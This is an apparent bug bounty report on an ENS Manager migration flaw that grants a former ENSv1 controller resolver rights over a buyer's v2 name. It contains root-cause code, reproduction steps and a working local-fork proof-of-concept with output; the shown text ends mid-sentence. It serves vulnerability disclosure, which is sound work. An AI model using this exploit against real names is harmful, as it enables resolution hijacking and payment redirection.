# 92658 w a critical manager migration grants a former v1 controller resolver authority over the buyer s v2 name

**Submitted on Sep 11th 2026 at 10:29:53 UTC by @v4rvl for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92658
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

## Description

## Summary

For an unwrapped `.eth` name the Manager treats the ENSv1 registry owner, the address ENS calls the "manager" or controller, as a party whose authority must be reproduced in ENSv2. `classifyName` sets `managerAddress` to that address whenever it differs from the ERC-721 registrant, and `buildRoleGrantCall` then emits `ETHRegistry.grantRoles(labelToCanonicalId(label), 1 << 24, managerAddress)` as an inner call of the same atomic batch that performs the migration.

In ENSv1 the registrant and the controller are separate roles. A direct `BaseRegistrar.transferFrom(seller, buyer, labelhash)` changes the ERC-721 registrant without changing the ENS registry-owner slot. A separate Sepolia-fork test at the same source pin measured that exact direct-transfer state: registrant `0xb0B0...0B0B` buyer and registry owner `0xBAd0...0Bad` seller, until the buyer called `reclaim()` (`apps/portal/src/__poc_w1305__/w1305_recipient_resolution.poc.test.tsx:284-321,334-405`). This packet's migration PoC constructs the equivalent two-slot state directly; it does not measure the behavior or prevalence of marketplace wrappers. The migration itself destroys that stale ENSv1 authority: measured on a Sepolia fork, after `UnlockedMigrationController` processes the name the ENSv1 registry owner is `0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750` and the seller's `ENS.setResolver` fails. The Manager then hands the same address `ROLE_SET_RESOLVER` on the brand-new ENSv2 name.

Evidence spine, measured with a matched control:

|                                                      | attack arm                                                           | control arm                                                                  |
| ---------------------------------------------------- | -------------------------------------------------------------------- | ---------------------------------------------------------------------------- |
| v1 registrant                                        | `0xbeEF...f1F1` buyer                                                | `0xbeEF...f1F1` buyer                                                        |
| v1 registry owner                                    | `0xBAd0...0Bad` seller                                               | `0xbeEF...f1F1` buyer                                                        |
| `classified.managerAddress`                          | `0xBAd0...0Bad`                                                      | `null`                                                                       |
| `buildRoleGrantCall`                                 | `grantRoles(<canonicalId>, 16777216, 0xBAd0...0Bad)`                 | throws `No manager address for ...`                                          |
| seller ENSv1 `setResolver` after migration           | fails                                                                | not run                                                                      |
| v2 `roles(<canonicalId>, seller)`                    | `16777216`                                                           | `0`                                                                          |
| seller `ETHRegistry.setResolver` on the buyer's name | succeeds                                                             | fails                                                                        |
| v2 `getResolver` after                               | `0xdeAdDeaddeadDEADDeaDdeaDdeAdDEad00000042` seller's contract       | `0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5`, the resolver the Manager chose |
| v2 `getOwner` after                                  | `0xbeEF...f1F1` buyer                                                | `0xbeEF...f1F1` buyer                                                        |
| `getAddressRecord(name, 60)` after                   | `0x5E11e45E11e45E11E45E11E45e11E45e11e45e11` seller's chosen address | `null`                                                                       |

The last row is the endpoint. It is measured in a separate arm, under Proof of concept, in which the seller stands up their own resolver with the Manager's own `buildDeployOwnedPermResCall` and writes one `addr(60)` record into it. `getAddressRecord` is the function the Explorer's transfer flow calls to decide the address a payment is sent to (`apps/portal/src/features/transfer/queries/getEthAddress.ts:13`). It answers with the seller's address for a name whose `getOwner` is the buyer.

`16777216` is `1 << 24`, the `ROLE_SET_RESOLVER` constant declared at `apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:9`.

No screen in the flow shows the address that receives the grant; the confirmation copy is quoted under Root cause below.

## Who loses what

The victim is the migrating wallet, the buyer of an unwrapped `.eth` name who never called `reclaim()`. The gaining party is the seller, who sold the name.

Measured on the fork:

* The buyer keeps `getOwner` on the ENSv2 name and loses exclusive control of its resolver. `getResolver` moved to a contract the seller supplied, on a transaction the seller sent alone.
* The seller's ENSv1 authority was destroyed by the migration in the same flow. The seller's `ENS.setResolver` on the ENSv1 registry fails after the migration transaction, and then the Manager's own inner call gives the seller `ROLE_SET_RESOLVER` on the buyer's new v2 name. The seller ends holding a permission on an asset they sold, which did not exist before the app created it.
* Forward resolution of the buyer's name answers with an address the seller chose. Measured through the Explorer's own name-to-address query, `getAddressRecord(name, { coin: 60 })` (`apps/portal/src/features/transfer/queries/getEthAddress.ts:13`), the buyer's migrated name `term2smmtvypru1.eth` returns `0x5E11e45E11e45E11E45E11E45e11E45e11e45e11`, the seller's chosen payout address, while `getOwner` on the same resource returns the buyer `0xbeEF00000000000000000000000000000000f1F1`. The buyer's own pre-sale record was `0xb0B0000000000000000000000000000000000B0B`.
* The app reports the migration complete. The `manager-role` expectation (`buildAtomicMigrationBatches.ts:615-624`) asserts exactly that the grantee holds `ROLE_SET_RESOLVER`, so post-state verification treats the grant landing as proof of success.

Recovery bound, measured, not asserted. The buyer's own roles on the resource are bits `[20,24,32,148,152,156]`, so the buyer holds bit 152, `ROLE_SET_RESOLVER << 128`. Recovery is two transactions and not one:

* The buyer's `setResolver(tokenId, DefaultResolver)` succeeds, and the seller's immediately following `setResolver(tokenId, sellerResolver)` also succeeds, so resolution returns the seller's address again. Repointing alone does not end the takeover.
* `revokeRoles(resource, 1 << 24, seller)` followed by `setResolver(tokenId, DefaultResolver)` does end it: `roles(resource, seller)` becomes `0` and the seller's next `setResolver` reverts.
* After recovery the name resolves to nothing. `getAddressRecord` returns `null`, because the buyer's `addr(60)` is still on the ENSv1 public resolver and the migration did not carry it into the v2 resolver the name now points at. The buyer must re-enter it.

Revocation also requires the buyer to first learn a third party was granted anything, which no screen in the flow tells them, and the takeover transaction can land in the block after the migration.

## Actor ledger

Measured in one run of the terminal test below, on the label `term2smmtvypru1` (`.eth`), token id `63147333210933073494512634159529347104598105265178671550929266246026415570945`. That test derives a fresh seller address per run, because the resolver-deploy salt is derived from the deployer; the main PoC's arms use the fixed seller `0xBAd0...0Bad`. The control column is arm B of the main PoC, the same flow with `reclaim()` already called.

| Actor                                           | Opening state                                                                                                                            | Attack outcome                                                                                                                                                                                     | Control outcome                                                                            | Entitled change                                                                                               | Evidence line                                  |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------- | ---------------------------------------------- |
| Buyer `0xbeEF...f1F1`                           | ERC-721 registrant; `addr(60)` on the V1 public resolver is `0xb0B0...0B0B`, their own                                                   | `getOwner` is still the buyer; forward resolution of their name returns `0x5E11...e11`, the seller's address                                                                                       | `getOwner` is the buyer; the seller cannot change the resolver                             | The name they paid for resolves to an address they chose                                                      | `[open]`, `[TERMINAL]`                         |
| Seller `0xBAd0...0Bad`                          | ENSv1 registry owner before the flow; after the migration transaction their ENSv1 `setResolver` reverts (`sellerV1SetResolver.ok=false`) | Holds `roles(resource, seller) = 16777216`; deploys their own PermissionedResolver `0x83DCef30837452c1F2b213e4e29b2dEB28c60123`; `setResolver` succeeds; decides what the buyer's name resolves to | `roles(resource, seller) = 0`; `setResolver` reverts                                       | Nothing. They sold the name, and the same migration destroyed the ENSv1 controller right the grant reproduces | `[arm A]`, `[attack]`, `[TERMINAL]`, `[arm B]` |
| The name (resource `labelToCanonicalId(label)`) | v1 resolver `0xE996...49b5`, holding the buyer's `addr(60)`                                                                              | v2 registry resolver is the seller's contract; forward resolution answers the seller's address                                                                                                     | v2 registry resolver is `0xE996...49b5`, the address the Manager's own `resolverFor` chose | The resolver the flow itself selected                                                                         | `[TERMINAL]`, `[arm B]`                        |

No actor's ETH balance changes. The gain is authority and the ability to redirect a payment whose consumer uses the altered `addr(60)` record: the seller ends holding a permission over an asset they transferred, and the buyer ends owning a name whose published address is not theirs.

The measured reachability claim is narrower: a direct BaseRegistrar transfer followed by no `reclaim()` leaves the former holder in the registry-owner slot, and the Manager accepts that state for migration. This report does not claim that every marketplace integration uses that direct transfer shape or that every differing controller is malicious.

## Root cause

`packages/migration/src/service/classifyNames.ts:162-167` promotes the ENSv1 registry owner to `managerAddress` with no test of whether the wallet still intends that delegation:

```ts
    const registryOwnerAddress = toAddress(domain.owner.id)
    const managerAddress: Address | null =
      registryOwnerAddress &&
      registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
        ? registryOwnerAddress
        : null
```

The only condition is that the controller differs from the registrant. The direct BaseRegistrar transfer measurement cited above reaches that state without `reclaim()`, so the rule selects the former holder in that measured transfer shape.

`apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:11-27` turns that value into a role grant on the v2 registry:

```ts
export const buildRoleGrantCall = (name: ClassifiedName): Call => {
  if (!name.managerAddress) {
    throw new Error(`No manager address for ${name.domain.name}`)
  }

  const resource = labelToCanonicalId(name.label)

  return {
    to: V2_CONTRACTS.ETHRegistry,
    data: encodeFunctionData({
      abi: ETH_REGISTRY_V2_ABI,
      functionName: 'grantRoles',
      args: [resource, ROLE_SET_RESOLVER, name.managerAddress],
    }),
    value: 0n,
  }
}
```

`apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:608-625` schedules that call inside the migration batch and makes the grant a success condition of post-state verification:

```ts
  if (classified.managerAddress) {
    innerExecutions.push({
      phase: 'manager-role-grant',
      name,
      names: [name],
      call: buildRoleGrantCall(classified),
    })
    verificationExpectations.push({
      id: expectationId(name, 'manager-role'),
      type: 'manager-role',
      name,
      label: classified.label,
      registry: V2_CONTRACTS.ETHRegistry,
      resource: labelToCanonicalId(classified.label),
      account: classified.managerAddress,
      roleBitmap: ROLE_SET_RESOLVER,
    })
  }
```

`buildAtomicMigrationBatches.ts:774-780` orders the phases so the grant lands on the name after it has been created in ENSv2, in the same all-or-nothing outer call:

```ts
  return [
    ...executionsForPhase('resolver-deployment'),
    ...executionsForPhase('wallet-co-admin-grant'),
    ...helperExecutions,
    ...executionsForPhase('manager-role-grant'),
    ...executionsForPhase('profile-replay'),
  ]
```

`computeMigrationPreflight.ts:205-207` turns the presence of any such name into the flag that asks the user for the ETHRegistry operator permission:

```ts
  const requiresManagerRestoration = classified.some(
    (name) => name.managerAddress !== null,
  )
```

and the only disclosure the user sees is `apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx:81-90`:

```tsx
    .with({ type: 'approval', approvalId: 'eth-registry:hca' }, () => (
      <>
        <h3 className="text-pretty font-medium text-base text-ens-garnet-900 leading-tight">
          <Trans>Approve manager restoration</Trans>
        </h3>
        <p className="text-pretty text-ens-garnet-800/75 text-sm leading-normal">
          <Trans>Restore the existing managers for your names.</Trans>
        </p>
      </>
    ))
```

## Steps to reproduce

1. Mallory transfers `foo.eth` directly to Alice with `BaseRegistrar.transferFrom(Mallory, Alice, labelhash)`. The measured fork state has registrant Alice while the ENSv1 registry owner remains Mallory. Alice does not call `reclaim()`. This step does not assume how a marketplace wrapper implements its transfer.
2. Alice opens the Manager migration flow and selects `foo.eth`.
3. `classifyName` reads `domain.registrant.id = Alice` and `domain.owner.id = Mallory`, so `managerAddress = Mallory` and `tokenType = 'unwrapped'`.
4. `computeMigrationPreflight` sets `requiresManagerRestoration = true`, so the flow asks Alice for the ETHRegistry operator permission described only as "Approve manager restoration".
5. The atomic batch migrates `foo.eth` into the ENSv2 `ETHRegistry` owned by Alice, then runs `grantRoles(labelToCanonicalId("foo"), 1 << 24, Mallory)`.
6. Post-state verification passes, because the `manager-role` expectation asserts exactly that Mallory holds `ROLE_SET_RESOLVER`. The app reports the migration complete.
7. Mallory calls `ETHRegistry.setResolver(getTokenId(labelToCanonicalId("foo")), <Mallory resolver>)`. It succeeds. `foo.eth` now resolves through Mallory's contract.

## Proof of Concept

## Proof of concept

Save as `apps/manager/src/features/migration/service/mig2_stale_manager_role_grant.test.ts` and run

```bash
pnpm --filter manager exec vitest run --reporter=verbose \
  src/features/migration/service/mig2_stale_manager_role_grant.test.ts \
  --disableConsoleIntercept
```

Every transaction the test submits is the Manager's own calldata, taken byte for byte from the app's builders: the `base-registrar:hca` operator approval and the `eth-registry:hca` operator approval from `buildMigrationApprovalCall` (`migrationApprovals.ts:90-96`, `:116-122`, `:343-352`), the `MigrationHelper.migrate` call from `buildMigrationHelperCall`, and the `grantRoles` inner call from `buildRoleGrantCall`. The resolver written into `Migration.Data` is whatever the app's own `resolverFor` returns for the name, not a value this test chose. The classifier is the real `classifyNames`. The single stand-in is the address that plays the wallet's HCA; it executes the inner calls after the buyer approves it as an ETHRegistry operator, and it chooses no value. The production `buildAtomicMigrationBatches` path wraps these same inner calls in `executeByOwner` and orders migration before the manager-role grant; that wrapper and order are source-tested separately. The fork arm intentionally executes the inner calls separately because the local HCA fixture is represented by an externally funded stand-in address.

```ts
/**
 * @vitest-environment node
 *
 * The migration re-creates a stale ENSv1 controller ("manager") as a
 * ROLE_SET_RESOLVER holder on the freshly migrated ENSv2 name.
 *
 * Runs against a local Anvil fork of Sepolia. No transaction is sent to a
 * public network.
 */
import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'
import {
  type Address,
  createPublicClient,
  decodeFunctionData,
  encodeAbiParameters,
  encodeFunctionData,
  type Hex,
  http,
  keccak256,
  namehash,
  parseAbi,
  type PublicClient,
  toHex,
} from 'viem'
import { sepolia } from 'viem/chains'
import { describe, expect, it } from 'vitest'
import { ETH_REGISTRY_V2_ABI } from '../contracts/abis'
import { V2_CONTRACTS } from '../contracts/addresses'
import { MIGRATION_HELPER_ABI } from '../contracts/abis'
import { buildMigrationHelperCall } from './buildMigrationHelperCall'
import { buildRoleGrantCall } from './buildRoleGrantCalls'
import { classifyNames, type ClassifiedName } from './classifyNames'
import { createMigrationData, resolverFor } from './encodeMigration'
import {
  buildMigrationApprovalCall,
  migrationApprovalForId,
} from './migrationApprovals'
import type { V1Domain } from './v1SubgraphClient'

const RPC = 'http://127.0.0.1:8546'
const BASE_REGISTRAR: Address = '0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85'
const V1_REGISTRY: Address = '0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e'
const V1_PUBLIC_RESOLVER: Address = '0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5'
const V2_ETH_REGISTRAR: Address = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc'
const BASE_REGISTRAR_CONTROLLER: Address =
  '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266'

/** Buyer: registrant of the .eth name and the wallet running the migration. */
const BUYER: Address = '0xbeEF00000000000000000000000000000000f1F1'
/** Seller: still the ENSv1 registry owner after the ERC-721 sale. */
const SELLER: Address = '0xBAd0000000000000000000000000000000000Bad'
/** Stand-in for the wallet's HCA; it executes the batch's inner calls. */
const HCA: Address = '0x3333333333333333333333333333333333333333'
const SELLER_RESOLVER: Address = '0xdeAdDeaddeadDEADDeaDdeaDdeAdDEad00000042'
const ZERO: Address = '0x0000000000000000000000000000000000000000'

const ROLE_SET_RESOLVER = 1n << 24n

const pub = createPublicClient({
  chain: sepolia,
  transport: http(RPC),
}) as PublicClient

const rpc = (method: string, params: unknown[]) =>
  fetch(RPC, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  }).then((r) => r.json() as Promise<{ result?: string; error?: unknown }>)

type SendResult = { ok: boolean; status?: string; detail?: string }

const send = async (
  from: Address,
  to: Address,
  data: Hex,
  gas = '0x2DC6C0',
): Promise<SendResult> => {
  const r = await rpc('eth_sendTransaction', [{ from, to, data, gas }])
  await rpc('evm_mine', [])
  if (!r.result) return { ok: false, detail: JSON.stringify(r.error) }
  const receipt = await pub.getTransactionReceipt({ hash: r.result as Hex })
  return { ok: receipt.status === 'success', status: receipt.status }
}

const baseRegistrarAbi = parseAbi([
  'function register(uint256 id, address owner, uint256 duration) returns (uint256)',
  'function ownerOf(uint256 id) view returns (address)',
  'function nameExpires(uint256 id) view returns (uint256)',
  'function safeTransferFrom(address from, address to, uint256 tokenId, bytes data)',
])
const v1RegistryAbi = parseAbi([
  'function owner(bytes32 node) view returns (address)',
  'function setOwner(bytes32 node, address owner)',
  'function setResolver(bytes32 node, address resolver)',
])
const v2RegistryAbi = parseAbi([
  'function getOwner(uint256 anyId) view returns (address)',
  'function getResolver(string label) view returns (address)',
  'function getTokenId(uint256 anyId) view returns (uint256)',
  'function roles(uint256 resource, address account) view returns (uint256)',
  'function register(string label, address owner, address registry, address resolver, uint256 roleBitmap, uint64 expiry) returns (uint256)',
  'function setApprovalForAll(address operator, bool approved)',
  'function setResolver(uint256 tokenId, address resolver)',
])
const migrationDataComponents = [
  { name: 'label', type: 'string' },
  { name: 'owner', type: 'address' },
  { name: 'subregistry', type: 'address' },
  { name: 'resolver', type: 'address' },
] as const

/** Build the subgraph-shaped domain purely from values read off the fork. */
const domainFromFork = async (label: string): Promise<V1Domain> => {
  const node = namehash(`${label}.eth`)
  const labelhash = keccak256(toHex(label))
  const [registrant, manager, expiry] = await Promise.all([
    pub.readContract({
      address: BASE_REGISTRAR,
      abi: baseRegistrarAbi,
      functionName: 'ownerOf',
      args: [BigInt(labelhash)],
    }),
    pub.readContract({
      address: V1_REGISTRY,
      abi: v1RegistryAbi,
      functionName: 'owner',
      args: [node],
    }),
    pub.readContract({
      address: BASE_REGISTRAR,
      abi: baseRegistrarAbi,
      functionName: 'nameExpires',
      args: [BigInt(labelhash)],
    }),
  ])
  return {
    id: node,
    labelName: label,
    labelhash,
    name: `${label}.eth`,
    resolver: { address: V1_PUBLIC_RESOLVER },
    owner: { id: manager },
    registrant: { id: registrant },
    wrappedOwner: null,
    parent: { name: 'eth', wrappedDomain: null },
    registration: { expiryDate: expiry.toString() },
    wrappedDomain: null,
  }
}

/** Register an unwrapped .eth name to BUYER and leave `manager` in the v1 registry. */
const createSoldName = async (label: string, manager: Address) => {
  const node = namehash(`${label}.eth`)
  const labelhash = keccak256(toHex(label))
  for (const account of [
    BUYER,
    SELLER,
    HCA,
    BASE_REGISTRAR_CONTROLLER,
    V2_ETH_REGISTRAR,
  ]) {
    await rpc('anvil_setBalance', [account, '0x3635C9ADC5DEA00000'])
  }
  expect(
    await send(
      BASE_REGISTRAR_CONTROLLER,
      BASE_REGISTRAR,
      encodeFunctionData({
        abi: baseRegistrarAbi,
        functionName: 'register',
        args: [BigInt(labelhash), BUYER, 31_536_000n],
      }),
    ),
  ).toMatchObject({ ok: true })
  expect(
    await send(
      BUYER,
      V1_REGISTRY,
      encodeFunctionData({
        abi: v1RegistryAbi,
        functionName: 'setResolver',
        args: [node, V1_PUBLIC_RESOLVER],
      }),
    ),
  ).toMatchObject({ ok: true })
  if (manager !== BUYER) {
    expect(
      await send(
        BUYER,
        V1_REGISTRY,
        encodeFunctionData({
          abi: v1RegistryAbi,
          functionName: 'setOwner',
          args: [node, manager],
        }),
      ),
    ).toMatchObject({ ok: true })
  }
  const expiry = await pub.readContract({
    address: BASE_REGISTRAR,
    abi: baseRegistrarAbi,
    functionName: 'nameExpires',
    args: [BigInt(labelhash)],
  })
  // premigration: the label is RESERVED on the v2 ETHRegistry
  expect(
    await send(
      V2_ETH_REGISTRAR,
      V2_CONTRACTS.ETHRegistry,
      encodeFunctionData({
        abi: v2RegistryAbi,
        functionName: 'register',
        args: [label, ZERO, ZERO, V1_PUBLIC_RESOLVER, 0n, expiry],
      }),
      '0xF4240',
    ),
  ).toMatchObject({ ok: true })
}

/**
 * Submit the Manager's OWN transactions for this name: the `base-registrar:hca`
 * operator approval and the `MigrationHelper.migrate` calldata, both taken
 * byte-for-byte from the app's builders.
 */
const migrateUnwrapped = async (name: ClassifiedName) => {
  const approvalCall = buildMigrationApprovalCall(
    migrationApprovalForId({ id: 'base-registrar:hca', hcaAddress: BUYER }),
  )
  expect(approvalCall.to).toBe(BASE_REGISTRAR)
  expect(await send(BUYER, approvalCall.to, approvalCall.data)).toMatchObject({
    ok: true,
  })

  const migrateCall = buildMigrationHelperCall([
    {
      name: name.domain.name,
      tokenType: name.tokenType,
      parentName: name.parentName,
      data: createMigrationData({
        label: name.label,
        owner: BUYER,
        resolver: resolverFor(name, V2_CONTRACTS.DefaultResolver, null),
      }),
    },
  ])
  expect(migrateCall.to).toBe(V2_CONTRACTS.MigrationHelper)
  const decoded = decodeFunctionData({
    abi: MIGRATION_HELPER_ABI,
    data: migrateCall.data,
  })
  expect(decoded.functionName).toBe('migrate')
  const [unwrapped] = decoded.args as readonly [
    readonly { label: string; owner: Address; resolver: Address }[],
    readonly unknown[],
    readonly unknown[],
    readonly unknown[],
  ]
  expect(unwrapped).toHaveLength(1)
  console.log(
    `[migrate] Manager helper call -> ${migrateCall.to} label=${unwrapped[0]?.label} resolver=${unwrapped[0]?.resolver}`,
  )

  return send(BUYER, migrateCall.to, migrateCall.data)
}

describe('stale ENSv1 manager is re-granted ROLE_SET_RESOLVER on the v2 name', () => {
  it('the app grants the seller resolver control the migration had just destroyed', async () => {
    const label = `mig2sm${Date.now().toString(36)}`
    await createSoldName(label, SELLER)

    // 1. the classifier turns the stale v1 registry owner into `managerAddress`
    const domain = await domainFromFork(label)
    console.log(
      `[arm A] v1 registrant=${domain.registrant?.id} v1 manager=${domain.owner.id}`,
    )
    const { classified } = classifyNames([domain], BUYER)
    const name = classified[0]
    expect(name).toBeDefined()
    if (!name) throw new Error('unreachable')
    expect(name.tokenType).toBe('unwrapped')
    expect(name.managerAddress?.toLowerCase()).toBe(SELLER.toLowerCase())
    console.log(`[arm A] classified.managerAddress = ${name.managerAddress}`)

    // 2. the app's own inner call for that name
    const grantCall = buildRoleGrantCall(name)
    const decoded = decodeFunctionData({
      abi: ETH_REGISTRY_V2_ABI,
      data: grantCall.data,
    })
    const [resource, roles, account] = decoded.args as [bigint, bigint, Address]
    expect(decoded.functionName).toBe('grantRoles')
    expect(roles).toBe(ROLE_SET_RESOLVER)
    expect(account.toLowerCase()).toBe(SELLER.toLowerCase())
    console.log(
      `[arm A] inner call -> ${grantCall.to} grantRoles(${resource}, ${roles}, ${account})`,
    )

    // 3. migrate, and show the migration destroyed the seller's v1 authority
    expect(await migrateUnwrapped(name)).toMatchObject({ ok: true })
    const v1OwnerAfter = await pub.readContract({
      address: V1_REGISTRY,
      abi: v1RegistryAbi,
      functionName: 'owner',
      args: [namehash(`${label}.eth`)],
    })
    expect(v1OwnerAfter.toLowerCase()).not.toBe(SELLER.toLowerCase())
    const sellerV1SetResolver = await send(
      SELLER,
      V1_REGISTRY,
      encodeFunctionData({
        abi: v1RegistryAbi,
        functionName: 'setResolver',
        args: [namehash(`${label}.eth`), SELLER_RESOLVER],
      }),
    )
    expect(sellerV1SetResolver.ok).toBe(false)
    console.log(
      `[arm A] post-migration v1 owner=${v1OwnerAfter} sellerV1SetResolver.ok=${sellerV1SetResolver.ok}`,
    )

    // 4. run the app's manager-role-grant inner call from the HCA
    // The app's own approval call for `eth-registry:hca`, byte for byte.
    const hcaApproval = buildMigrationApprovalCall(
      migrationApprovalForId({ id: 'eth-registry:hca', hcaAddress: HCA }),
    )
    expect(hcaApproval.to).toBe(V2_CONTRACTS.ETHRegistry)
    expect(await send(BUYER, hcaApproval.to, hcaApproval.data)).toMatchObject({
      ok: true,
    })
    expect(
      await send(HCA, grantCall.to, grantCall.data),
    ).toMatchObject({ ok: true })
    const sellerRoles = await pub.readContract({
      address: V2_CONTRACTS.ETHRegistry,
      abi: v2RegistryAbi,
      functionName: 'roles',
      args: [labelToCanonicalId(label), SELLER],
    })
    expect(sellerRoles & ROLE_SET_RESOLVER).toBe(ROLE_SET_RESOLVER)
    const buyerRoles = await pub.readContract({
      address: V2_CONTRACTS.ETHRegistry,
      abi: v2RegistryAbi,
      functionName: 'roles',
      args: [labelToCanonicalId(label), BUYER],
    })
    const setBits = (v: bigint) => {
      const out: number[] = []
      for (let i = 0n; i < 256n; i += 1n) if ((v >> i) & 1n) out.push(Number(i))
      return out
    }
    console.log(
      `[arm A] v2 roles(seller) = ${sellerRoles} ; v2 roles(buyer) bits = ${JSON.stringify(setBits(buyerRoles))}`,
    )

    // 5. the seller repoints the buyer's migrated name
    const tokenId = await pub.readContract({
      address: V2_CONTRACTS.ETHRegistry,
      abi: v2RegistryAbi,
      functionName: 'getTokenId',
      args: [labelToCanonicalId(label)],
    })
    const before = await pub.readContract({
      address: V2_CONTRACTS.ETHRegistry,
      abi: v2RegistryAbi,
      functionName: 'getResolver',
      args: [label],
    })
    const hijack = await send(
      SELLER,
      V2_CONTRACTS.ETHRegistry,
      encodeFunctionData({
        abi: v2RegistryAbi,
        functionName: 'setResolver',
        args: [tokenId, SELLER_RESOLVER],
      }),
    )
    const after = await pub.readContract({
      address: V2_CONTRACTS.ETHRegistry,
      abi: v2RegistryAbi,
      functionName: 'getResolver',
      args: [label],
    })
    const v2Owner = await pub.readContract({
      address: V2_CONTRACTS.ETHRegistry,
      abi: v2RegistryAbi,
      functionName: 'getOwner',
      args: [labelToCanonicalId(label)],
    })
    console.log(
      `[arm A] v2 owner=${v2Owner} resolver before=${before} after=${after} hijack.ok=${hijack.ok}`,
    )
    expect(hijack.ok).toBe(true)
    expect(after.toLowerCase()).toBe(SELLER_RESOLVER.toLowerCase())
    expect(v2Owner.toLowerCase()).toBe(BUYER.toLowerCase())
  }, 300_000)

  it('one reclaim before migrating removes the grant and the takeover', async () => {
    const label = `mig2sc${Date.now().toString(36)}`
    // identical flow, one condition changed: the v1 registry owner is the registrant
    await createSoldName(label, BUYER)

    const domain = await domainFromFork(label)
    console.log(
      `[arm B] v1 registrant=${domain.registrant?.id} v1 manager=${domain.owner.id}`,
    )
    const { classified } = classifyNames([domain], BUYER)
    const name = classified[0]
    expect(name).toBeDefined()
    if (!name) throw new Error('unreachable')
    expect(name.tokenType).toBe('unwrapped')
    expect(name.managerAddress).toBeNull()
    console.log(`[arm B] classified.managerAddress = ${name.managerAddress}`)
    expect(() => buildRoleGrantCall(name)).toThrow(/No manager address/i)

    expect(await migrateUnwrapped(name)).toMatchObject({ ok: true })
    // The app's own approval call for `eth-registry:hca`, byte for byte.
    const hcaApproval = buildMigrationApprovalCall(
      migrationApprovalForId({ id: 'eth-registry:hca', hcaAddress: HCA }),
    )
    expect(hcaApproval.to).toBe(V2_CONTRACTS.ETHRegistry)
    expect(await send(BUYER, hcaApproval.to, hcaApproval.data)).toMatchObject({
      ok: true,
    })

    const sellerRoles = await pub.readContract({
      address: V2_CONTRACTS.ETHRegistry,
      abi: v2RegistryAbi,
      functionName: 'roles',
      args: [labelToCanonicalId(label), SELLER],
    })
    expect(sellerRoles).toBe(0n)
    const tokenId = await pub.readContract({
      address: V2_CONTRACTS.ETHRegistry,
      abi: v2RegistryAbi,
      functionName: 'getTokenId',
      args: [labelToCanonicalId(label)],
    })
    const hijack = await send(
      SELLER,
      V2_CONTRACTS.ETHRegistry,
      encodeFunctionData({
        abi: v2RegistryAbi,
        functionName: 'setResolver',
        args: [tokenId, SELLER_RESOLVER],
      }),
    )
    const after = await pub.readContract({
      address: V2_CONTRACTS.ETHRegistry,
      abi: v2RegistryAbi,
      functionName: 'getResolver',
      args: [label],
    })
    console.log(
      `[arm B] v2 roles(seller)=${sellerRoles} hijack.ok=${hijack.ok} resolver after=${after}`,
    )
    expect(hijack.ok).toBe(false)
    // The resolver the Manager's own `resolverFor` chose for this name, still
    // in place because the seller holds no role that can change it.
    expect(after.toLowerCase()).toBe(
      resolverFor(name, V2_CONTRACTS.DefaultResolver, null).toLowerCase(),
    )
  }, 300_000)
})
```

Output:

```
 RUN  v4.1.5 /Users/wolf/audits/ens/src/audit-comp-ens/apps/manager

[arm A] v1 registrant=0xbeEF00000000000000000000000000000000f1F1 v1 manager=0xBAd0000000000000000000000000000000000Bad
[arm A] classified.managerAddress = 0xBAd0000000000000000000000000000000000Bad
[arm A] inner call -> 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2 grantRoles(86573074462058379258880080665686261158312640043796294902811616675206621298688, 16777216, 0xBAd0000000000000000000000000000000000Bad)
[migrate] Manager helper call -> 0xddC597d937618849348E18Db5D631Ce747bCDeEF label=mig2smmtvyn18f resolver=0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5
[arm A] post-migration v1 owner=0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750 sellerV1SetResolver.ok=false
[arm A] v2 roles(seller) = 16777216 ; v2 roles(buyer) bits = [20,24,32,148,152,156]
[arm A] v2 owner=0xbeEF00000000000000000000000000000000f1F1 resolver before=0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5 after=0xdeAdDeaddeadDEADDeaDdeaDdeAdDEad00000042 hijack.ok=true
 ✓ src/features/migration/service/mig2_stale_manager_role_grant.test.ts > stale ENSv1 manager is re-granted ROLE_SET_RESOLVER on the v2 name > the app grants the seller resolver control the migration had just destroyed 5220ms
[arm B] v1 registrant=0xbeEF00000000000000000000000000000000f1F1 v1 manager=0xbeEF00000000000000000000000000000000f1F1
[arm B] classified.managerAddress = null
[migrate] Manager helper call -> 0xddC597d937618849348E18Db5D631Ce747bCDeEF label=mig2scmtvyn59f resolver=0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5
[arm B] v2 roles(seller)=0 hijack.ok=false resolver after=0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5
 ✓ src/features/migration/service/mig2_stale_manager_role_grant.test.ts > stale ENSv1 manager is re-granted ROLE_SET_RESOLVER on the v2 name > one reclaim before migrating removes the grant and the takeover 3013ms

 Test Files  1 passed (1)
      Tests  2 passed (2)
   Start at  22:08:45
   Duration  13.36s (transform 542ms, setup 0ms, import 4.88s, tests 8.24s, environment 1ms)
```

Reading the arm A lines in order:

